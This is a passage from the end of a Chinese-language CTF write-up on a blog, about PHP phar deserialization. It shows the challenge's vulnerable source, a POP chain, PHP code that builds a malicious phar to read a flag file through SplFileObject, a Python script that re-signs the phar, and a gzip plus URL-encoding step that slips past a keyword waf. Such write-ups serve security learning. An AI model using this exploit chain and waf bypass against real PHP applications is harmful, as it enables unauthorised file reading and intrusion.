+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>start</span> <span class=o>==</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>waf</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$f</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$f</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;It is file&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;You can look at the others&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>banana</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$name</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=nv>$name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=c1>// flag in /
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>&lt;</span> <span class=mi>55</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;str too long&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>throw</span> <span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=s2>&#34;start&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>Fatal error: Uncaught Error: start in /var/www/html/index.php:80 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 80
+</span></span></span></code></pre></td></tr></table></div></div><p>GC绕过抛出错误，参数不能太长，利用原生类进行列目录和文件读取，先利用类D来写入phar文件，然后用类D触发phar反序列化，没毛病开整</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>tree::__destruct()-&gt;tree::__call()-&gt;apple::__get()-&gt;air::__set()
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>D</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$start</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>D</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=c1>//$a-&gt;start=&#39;w&#39;;
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>start</span><span class=o>=</span><span class=s1>&#39;r&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>air</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$p</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>tree</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$act</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>apple</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$xxx</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>tree</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=k>new</span> <span class=nx>tree</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=k>new</span> <span class=nx>apple</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>-&gt;</span><span class=na>xxx</span><span class=o>=</span><span class=k>new</span> <span class=nx>air</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>-&gt;</span><span class=na>xxx</span><span class=o>-&gt;</span><span class=na>p</span><span class=o>=</span><span class=k>new</span> <span class=nx>tree</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=c1>//$a-&gt;name-&gt;name-&gt;xxx-&gt;p-&gt;act=&#34;DirectoryIterator&#34;;
+</span></span></span><span class=line><span class=cl><span class=c1>//$a-&gt;name-&gt;name-&gt;flag=&#34;glob:///*f*&#34;;
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>-&gt;</span><span class=na>xxx</span><span class=o>-&gt;</span><span class=na>p</span><span class=o>-&gt;</span><span class=na>act</span><span class=o>=</span><span class=s2>&#34;SplFileObject&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>-&gt;</span><span class=na>flag</span><span class=o>=</span><span class=s2>&#34;/fflaggg&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;test.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;phar.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>f</span><span class=p>[:</span><span class=o>-</span><span class=mi>28</span><span class=p>]</span>  <span class=c1># 获取要签名的数据</span>
+</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=n>f</span><span class=p>[</span><span class=o>-</span><span class=mi>8</span><span class=p>:]</span>  <span class=c1># 获取签名类型和GBMB标识</span>
+</span></span><span class=line><span class=cl><span class=n>newf</span> <span class=o>=</span> <span class=n>s</span> <span class=o>+</span> <span class=n>sha1</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span> <span class=o>+</span> <span class=n>h</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;exp.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>newf</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>因为有waf检测类关键词，所以进行gzip压缩</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gzip</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;exp.phar&#34;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>phar_data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>compressed_data</span> <span class=o>=</span> <span class=n>gzip</span><span class=o>.</span><span class=n>compress</span><span class=p>(</span><span class=n>phar_data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>encoded</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>compressed_data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>encoded</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/phar-deserialization-analysis/1.png width=1464 height=756 loading=lazy alt=1></p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a>
+<a href=/tags/phar/>Phar</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
